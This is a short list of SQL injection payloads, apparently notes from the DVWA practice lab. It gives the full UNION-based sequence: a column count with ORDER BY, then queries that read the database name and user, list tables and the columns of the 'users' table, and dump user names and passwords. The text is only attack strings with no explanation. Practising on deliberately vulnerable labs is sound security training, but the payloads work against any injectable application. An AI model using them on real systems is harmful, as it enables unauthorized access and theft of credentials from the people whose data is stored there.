1' order by 2#

1' UNION SELECT database(),user()#

1' UNION SELECT database(),table_name FROM information_schema.tables#

1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users'#

1' UNION SELECT user, password FROM users#

1' UNION SELECT database(),table_name FROM information_schema.tables WHERE table_schema = 'dvwa'#